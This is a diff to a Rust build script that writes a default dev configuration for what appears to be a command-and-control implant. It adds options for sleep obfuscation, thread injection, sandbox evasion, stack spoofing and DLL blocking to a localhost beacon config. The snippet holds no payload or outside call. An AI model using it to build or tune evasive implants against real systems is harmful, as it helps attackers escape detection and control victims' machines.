@@ -20,14 +20,19 @@ fn main() {
     if !cfg_path.exists() {
         // Minimal valid config for a dev build.
         let placeholder = serde_json::json!({
-            "c2_host":    "127.0.0.1",
-            "c2_port":    8080,
-            "protocol":   "http",
-            "sleep_ms":   5000,
-            "jitter_pct": 10,
-            "dns_domain": null,
-            "pipe_name":  null,
-            "build_id":   "dev-build"
+            "c2_host":        "127.0.0.1",
+            "c2_port":        8080,
+            "protocol":       "http",
+            "sleep_ms":       5000,
+            "jitter_pct":     10,
+            "dns_domain":     null,
+            "pipe_name":      null,
+            "build_id":       "dev-build",
+            "sleep_obf":      "none",
+            "injection":      "create_thread",
+            "sandbox_evasion": false,
+            "stack_spoof":    false,
+            "block_dlls":     false
         });
         let plain = serde_json::to_vec(&placeholder).unwrap();
         // XOR with the placeholder key (all zeros → identity)
